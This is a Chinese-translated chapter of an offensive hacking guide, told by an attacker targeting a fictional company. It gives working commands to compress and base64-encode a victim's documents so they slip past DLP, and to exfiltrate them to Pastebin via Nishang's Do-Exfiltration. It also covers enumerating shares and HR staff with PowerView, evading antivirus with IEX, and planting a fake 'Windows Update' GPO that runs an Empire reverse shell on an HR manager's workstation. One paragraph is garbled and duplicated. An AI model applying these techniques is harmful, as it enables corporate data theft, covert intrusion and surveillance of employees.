# 第五章、数据狩猎

> 炼金术士在寻找金子时发现了许多更有价值的东西。 -- *Earl Derr Biggers*（亚瑟叔本华）

现在我们有了通往王国的钥匙，我们可以完全专注于实现我们“访问”的真正目的:
- 获取商业秘密、人力资源和商业战略文件
- 转储CEO的珍贵邮件。泄露客户记录

## 5.1 数据窃取技术

定位数据很容易，但在不触发所有告警系统的情况下把数据取出来就有点棘手了。假如你尝试将错误的ppt格式文件上传到谷歌硬盘，那么数据防泄漏系统(DLP)类的工具就会告警，无论数据多小。我们必须小心。

总之，我们需要一个可靠的战略：
- 毫不费力地获取大数据（千兆字节）；
- 对数据加密以使后续的调查查不到实际采取的措施；
- 找一个绕过防火墙或web代理的可靠方法。

如果我们在一个晚上窃取了50GB的数据，那么流量会有明显增加，之后还让对方查到数据泄露的时间。可能当流量达到一定的阈值，甚至可能会发出警报，这太麻烦了!为了避免任何麻烦，我们将把待走私的数据分成多块，并在随机的某小时/某天/某周将数据窃取出去。

假设我们要将Rachel的主目录“C:\users\Rachel\documents”数据偷偷传出去。首先，我们使用本地PowerShell命令对其进行压缩(适用于Windows 8和Windows 10，但不适用于Windows 7)
```
PS> Get-ChildItem C:\users\Rachel\documents | Compress-Archive -DestinationPath c:\users\Rachel\documents.zip
```

提示:要设置一个密码，并在目标机上安装7zip和使用此PowerShell脚本http://blog.danskingdom.com/powershell-function-to-create-passwordprotectedzip-file。


然而，窃取此zip文件可能会被DLP系统捕获，该DLP系统可以解压缩文件来查找带标签的文档。如果无法解压文件，系统可能会阻止它外传。这就是为什么我们需要添加另一个欺骗手段：即将这个显而易见的zip文件转换成一个普通的旧文本文件，使得它能通过任何DLP系统。

我们可以使用Windows本地命令“certutil -encode”，用base64对压缩的文档进行编码，然后将生成的文本文件发送到一个上传服务器。 但是，这有一个工具可以自动执行此操作，并节省了几分钟的代码，即Nishang提供的Do-Exulation.ps1 [74]。
此工具有两个主要选项:
- 通过HTTPS将数据传输到我们控制的Web服务器。
- 将数据嵌入到发送到我们的DNS服务器的DNS查询中。这是绕过防火墙规则和代理过滤的一种非常聪明的方法，因为必须允许DNS穿过这种设备。

我们将使用第一个选项，因为它提供了一个有趣的选项，可以直接将数据上传到Pastebin.com，所以我们不必担心设置web服务器。

我们在Pastebin上设置一个帐户，并获得一个API密钥(以下称为dev_key)。然后，我们使用以下命令执行Do- Exfiltering:
```
PS C:\users\Rachel> Get-content documents.zip | Do- Exfiltration -ExfilOption pastebin -dev_key 0d19a7649774b35181f0d008f1824435 username paste_user_13 -password paste_password_13
```
如您所见，我们可以直接从PasteBin获取文件。

为了恢复压缩的文档，我们下载了文本文件，然后在Linux上使用base64命令对其进行解码。
`FrontGun$ cat data.txt | base64 -d > documents.zip`

现在我们知道如何获取数据了,让我们来进一步挖掘一些价值!

## 5.2 战略文件

敏感的商业文件一般存放在如下两个地方:
- 服务器(有时是工作站)上的网络共享。
- 用户工作站，通常是VIP、HR、市场营销和会计人员的计算机。
- 
从10.10.20.118上的RDP会话中，我们可以列出远程服务器上的网络共享，直到我们访问成功！:
```#bash
>	net view \\10.10.20.229 /all
Share name Type Used as Comment

--------------------------------------------
ADMIN$		Disk		Remote Admin 
C$	Disk	Default share 
Common		Disk
ExCom	Disk
IPC$	IPC	Remote IPC
Marketing	Disk
```
![xxx示意图](./Chap5/5.2-1.jpg)

提示：我们使用invoke-expression（IEX）加载脚本，以免触发防病毒系统告警。
我们将所需的任何目录复制到我们控制的Windows服务器上，将其压缩并使用前面介绍的技术进行窃取。 通常我们可以得到足够的网络共享数据，使整个公司蒙羞七次，直到星期日。
如果我们想要更进一步，我们可以针对特定的用户钓鱼和获取信息。要做到这一点，我们需要知道哪些人在公司内部担任关键职位。
我们轻轻向AD域查询员工的职位和部门，从而映射整个组织架构。有了特权访问权限，我们可以远程检索他们计算机的任何文件，甚至可以记录按键操作、启用摄像头、获取记录等。
我们从PowerView执行Get-NetUser来列出HR的工作人员:


PS > Get-NetUser -filter "department=HR*"

name	: Juliette company		: SPH
description	: Head of HR
department	: HR
lastlogontimestamp	: 12/30/2016 6:25:47 PM physicaldeliveryofficename : HR department
title	: HR manager […]
name	: mark
company	: SPH
department	: HR
displayname	: mark
pwdlastset	: 12/29/2016 9:27:08 PM […]




我们重复此过程来映射公司内部的所有其他主要结构：ExCom，Marketing，Accounting等。获取用户名后，我们可以通过查找其工作站的IP/name来追踪它们。
最可靠的方法是解析域控上的成连接事件日志。它通常包含用户登录的最后一台计算机。
PowerView提供了Invoke-EventHunter模块来轻松完成此任务：
PS > Invoke-EventHunter -username Juliette	
朱丽叶最后一次使用了工作站FRPC066(10.10.20.66)。我们尝试远程访问她的工作站的默认共享文件夹，但最终被本地防火墙阻止:

没有RDP，也没有RPC端口……基本上无法从我们控制的计算机渗入。但是，我们控制着AD域，所以可以肯定，我们能够解决这些难题。
我们的救赎在于一般的政策和对象。GPO是在域级别定义的一组设置，用于更改资源配置:设置代理、更改屏幕保护程序，当然还有执行脚本!现在Every then,工作站调查新的GPO设置的域为逃避防火墙rules. controller...which是完美的如果我们可以插入一个执行PowerShell脚本的设置，我们就可以在她的机器上运行一个反向shell，并在以后做我们想做的任何事情。
我们的攻击入口在常规策略对象GPO。 GPO是在域级别定义的一组设置，用于更改资源的配置：设置代理，更改屏幕保护程序以及执行脚本！ 工作站不时地从域控中轮询新的GPO设置，这是逃避防火墙规则的完美之选。 如果我们可以进入执行PowerShell脚本的设置，则可以在她的计算机上运行一个反向shell，并在以后执行几乎所有需要的操作。
首先，我们在PowerShell会话中激活并导入可用的组策略模块(10.10.20.118):


然后，我们创建一个名为Windows更新的假GPO（我们以域控制器FRSV210为目标）：

我们只想针对Juliette在计算机FRPC066上的账户，所以我们限制了这个GPO的范围:

 

最后，我们将它连接到SPH域来激活它:

我们返回到Front Gun服务器上的Empire框架，并生成一个新的反向Shell代理，这次将它编码为base64，以便很好地适合注册表项：



然后，我们指示我们创建的GPO在下一次Juliette的计算机轮询新设置时设置“运行”注册表项。 此注册表项将在Juliette的下次登录时执行PowerShell代理：


我们耐心等待，直到最终，我们的反向shell连接成功

进入工作站后，我们几乎可以执行如前所述的相同操作来窃取数据。





